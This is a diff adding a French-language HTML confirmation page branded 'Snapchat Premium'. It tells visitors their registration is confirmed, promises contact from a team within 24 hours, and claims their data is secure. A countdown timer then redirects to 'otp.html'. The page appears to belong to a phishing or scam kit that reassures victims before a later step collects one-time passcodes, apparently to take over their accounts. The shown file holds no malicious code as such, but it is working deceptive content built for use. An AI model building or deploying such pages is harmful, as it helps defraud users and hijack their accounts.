@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Merci 🎁</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: #0d0020;
+    color: #fff;
+    font-family: 'Poppins', sans-serif;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    overflow-x: hidden;
+  }
+
+  /* ── FOND ── */
+  .orb {
+    position: fixed; border-radius: 50%;
+    filter: blur(90px); opacity: 0.3;
+    animation: orbFloat linear infinite; z-index: 0; pointer-events: none;
+  }
+  .orb1 { width: 600px; height: 600px; background: #7b00ff; top: -200px; left: -200px; animation-duration: 18s; }
+  .orb2 { width: 500px; height: 500px; background: #f7b500; bottom: -150px; right: -150px; animation-duration: 22s; animation-delay: -8s; }
+  .orb3 { width: 350px; height: 350px; background: #ff00cc; top: 35%; left: 55%; animation-duration: 15s; animation-delay: -4s; }
+  @keyframes orbFloat {
+    0%   { transform: translate(0,0) scale(1); }
+    33%  { transform: translate(50px,-70px) scale(1.1); }
+    66%  { transform: translate(-40px,50px) scale(0.95); }
+    100% { transform: translate(0,0) scale(1); }
+  }
+
+  .grid {
+    position: fixed; inset: 0; z-index: 0; pointer-events: none;
+    background-image:
+      linear-gradient(rgba(155,0,255,0.06) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(155,0,255,0.06) 1px, transparent 1px);
+    background-size: 60px 60px;
+    animation: gridMove 20s linear infinite;
+  }
+  @keyframes gridMove { from { background-position: 0 0; } to { background-position: 60px 60px; } }
+
+  .particles { position: fixed; inset: 0; z-index: 0; pointer-events: none; }
+  .p { position: absolute; border-radius: 50%; animation: rise linear infinite; opacity: 0; }
+  @keyframes rise {
+    0%   { transform: translateY(0) scale(0); opacity: 0; }
+    10%  { opacity: 1; } 90% { opacity: 0.5; }
+    100% { transform: translateY(-100vh) scale(1.5); opacity: 0; }
+  }
+
+  /* ── LAYOUT PC : 2 colonnes ── */
+  .page {
+    position: relative; z-index: 10;
+    display: flex; align-items: center; gap: 60px;
+    padding: 40px 60px;
+    width: 100%; max-width: 1100px;
+    animation: slideUp 0.6s cubic-bezier(0.16,1,0.3,1) both;
+  }
+  @keyframes slideUp {
+    from { opacity: 0; transform: translateY(30px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  /* ── COLONNE GAUCHE ── */
+  .info-col {
+    flex: 1;
+    display: flex; flex-direction: column; gap: 28px;
+  }
+
+  .brand { display: flex; align-items: center; gap: 14px; }
+  .brand-logo {
+    width: 56px; height: 56px;
+    background: linear-gradient(135deg, #4dff88, #00c853);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 28px;
+    box-shadow: 0 0 24px rgba(77,255,136,0.4);
+    animation: logoPulse 2s ease-in-out infinite;
+    flex-shrink: 0;
+  }
+  @keyframes logoPulse {
+    0%,100% { box-shadow: 0 0 0 0 rgba(77,255,136,0.4), 0 4px 20px rgba(77,255,136,0.3); }
+    50%      { box-shadow: 0 0 0 10px rgba(77,255,136,0), 0 4px 30px rgba(77,255,136,0.5); }
+  }
+  .brand-name { font-size: 20px; font-weight: 700; }
+  .brand-sub  { font-size: 12px; color: rgba(255,255,255,0.4); margin-top: 2px; }
+
+  .info-title {
+    font-size: 38px; font-weight: 700; line-height: 1.2;
+    background: linear-gradient(135deg, #fff 30%, #c97fff 80%);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+  }
+  .info-title span { -webkit-text-fill-color: #4dff88; }
+
+  .info-desc { font-size: 15px; color: rgba(255,255,255,0.5); line-height: 1.7; }
+
+  .steps { display: flex; flex-direction: column; gap: 12px; }
+  .step-item {
+    display: flex; align-items: center; gap: 14px;
+    background: rgba(255,255,255,0.04);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 12px; padding: 14px 16px;
+  }
+  .step-num {
+    width: 32px; height: 32px; border-radius: 50%;
+    background: rgba(77,255,136,0.15); border: 1px solid rgba(77,255,136,0.3);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 13px; font-weight: 700; color: #4dff88; flex-shrink: 0;
+  }
+  .step-text { font-size: 14px; color: rgba(255,255,255,0.7); }
+
+  /* ── COLONNE DROITE (card) ── */
+  .card {
+    width: 420px; flex-shrink: 0;
+    background: rgba(255,255,255,0.04);
+    backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 28px; padding: 44px 36px 36px;
+    text-align: center;
+    box-shadow: 0 0 0 1px rgba(155,0,255,0.15) inset, 0 20px 60px rgba(0,0,0,0.5), 0 0 80px rgba(123,0,255,0.12);
+    position: relative;
+  }
+  .card::before {
+    content: ''; position: absolute; inset: -1px; border-radius: 29px;
+    background: linear-gradient(135deg, rgba(77,255,136,0.4), rgba(247,181,0,0.3), rgba(155,0,255,0.4), rgba(77,255,136,0.4));
+    background-size: 300% 300%;
+    animation: borderGlow 4s ease infinite;
+    z-index: -1;
+    mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+    -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+    mask-composite: exclude; -webkit-mask-composite: xor; padding: 1px;
+  }
+  @keyframes borderGlow {
+    0%   { background-position: 0% 50%; }
+    50%  { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+  }
+
+  .icon {
+    width: 80px; height: 80px;
+    background: linear-gradient(135deg, #4dff88, #00c853);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 40px; margin: 0 auto 22px;
+    animation: iconPulse 2s ease-in-out infinite;
+  }
+  @keyframes iconPulse {
+    0%,100% { box-shadow: 0 0 0 0 rgba(77,255,136,0.4), 0 4px 20px rgba(77,255,136,0.3); }
+    50%      { box-shadow: 0 0 0 14px rgba(77,255,136,0), 0 4px 30px rgba(77,255,136,0.5); }
+  }
+
+  .card h2 {
+    font-size: 22px; font-weight: 700; margin-bottom: 10px;
+    background: linear-gradient(135deg, #fff 40%, #c97fff);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+  }
+  .card p { font-size: 14px; color: rgba(255,255,255,0.5); line-height: 1.7; }
+
+  .badge {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: rgba(77,255,136,0.1); border: 1px solid rgba(77,255,136,0.3);
+    border-radius: 20px; padding: 6px 16px;
+    font-size: 13px; font-weight: 500; color: #4dff88;
+    margin-top: 20px;
+  }
+  .dot {
+    width: 8px; height: 8px; background: #4dff88; border-radius: 50%;
+    animation: blink 1.2s ease-in-out infinite;
+  }
+  @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.2; } }
+
+  .timer-wrap {
+    margin-top: 24px;
+    background: rgba(255,255,255,0.04);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 16px; padding: 16px 20px;
+  }
+  .timer-label {
+    font-size: 11px; font-weight: 600; text-transform: uppercase;
+    letter-spacing: 0.8px; color: rgba(255,255,255,0.3); margin-bottom: 6px;
+  }
+  #timer {
+    font-size: 32px; font-weight: 700; letter-spacing: 3px;
+    background: linear-gradient(135deg, #f7b500, #ff8c00);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+  }
+
+  .footer-note { font-size: 11px; color: rgba(255,255,255,0.2); margin-top: 22px; }
+
+  /* ══════════════════════════════
+     MOBILE  (≤ 768px)
+  ══════════════════════════════ */
+  @media (max-width: 768px) {
+    body { align-items: flex-start; overflow-y: auto; }
+
+    .page {
+      flex-direction: column; gap: 0;
+      padding: 0; width: 100%; max-width: 100%;
+      min-height: 100vh;
+    }
+
+    .info-col {
+      gap: 0;
+      background: linear-gradient(180deg, rgba(77,255,136,0.12) 0%, transparent 100%);
+      padding: 36px 24px 28px;
+      border-bottom: 1px solid rgba(255,255,255,0.07);
+    }
+    .info-title { font-size: 26px; margin-top: 16px; }
+    .info-desc  { font-size: 13px; margin-top: 10px; }
+    .steps      { display: none; }
+
+    .card {
+      width: 100%; border-radius: 0;
+      border-left: none; border-right: none; border-bottom: none;
+      padding: 32px 24px 48px;
+      box-shadow: none; flex: 1;
+    }
+    .card::before { display: none; }
+    #timer { font-size: 26px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
+<div class="orb orb3"></div>
+<div class="grid"></div>
+<div class="particles" id="particles"></div>
+
+<div class="page">
+
+  <!-- Colonne gauche -->
+  <div class="info-col">
+    <div class="brand">
+      <div class="brand-logo">✅</div>
+      <div>
+        <div class="brand-name">Snapchat Premium</div>
+        <div class="brand-sub">Inscription confirmée</div>
+      </div>
+    </div>
+
+    <div class="info-title">Félicitations,<br><span>c'est validé !</span></div>
+    <div class="info-desc">Votre demande a bien été enregistrée. Un membre de notre équipe va vous contacter très prochainement pour finaliser l'activation.</div>
+
+    <div class="steps">
+      <div class="step-item">
+        <div class="step-num">✓</div>
+        <div class="step-text">Informations enregistrées</div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">2</div>
+        <div class="step-text">Contact par notre équipe sous 24h</div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">3</div>
+        <div class="step-text">Activation de votre accès premium</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Colonne droite -->
+  <div class="card">
+    <div class="icon">✅</div>
+    <h2>Merci pour votre participation !</h2>
+    <p>Une personne vous contactera bientôt.<br>Veuillez patienter…</p>
+
+    <div class="badge">
+      <span class="dot"></span>
+      En attente de contact
+    </div>
+
+    <div class="timer-wrap">
+      <div class="timer-label">Redirection dans</div>
+      <div id="timer">05:00</div>
+    </div>
+
+    <p class="footer-note">🔒 Vos données sont sécurisées</p>
+  </div>
+
+</div>
+
+<script>
+  /* Particules */
+  const container = document.getElementById('particles');
+  const colors = ['#f7b500','#9b00ff','#ff00cc','#ffffff','#00cfff'];
+  for (let i = 0; i < 45; i++) {
+    const p = document.createElement('div');
+    p.className = 'p';
+    const size = Math.random() * 6 + 2;
+    p.style.cssText = `width:${size}px;height:${size}px;left:${Math.random()*100}%;bottom:${Math.random()*15}%;background:${colors[Math.floor(Math.random()*colors.length)]};animation-duration:${Math.random()*12+8}s;animation-delay:${Math.random()*10}s;opacity:0;`;
+    container.appendChild(p);
+  }
+
+  /* Timer */
+  let total = 5 * 60;
+  const timerEl = document.getElementById('timer');
+  const interval = setInterval(() => {
+    total--;
+    const m = String(Math.floor(total/60)).padStart(2,'0');
+    const s = String(total%60).padStart(2,'0');
+    timerEl.textContent = `${m}:${s}`;
+    if (total <= 0) { clearInterval(interval); location.href = 'otp.html'; }
+  }, 1000);
+</script>
+</body>
+</html>
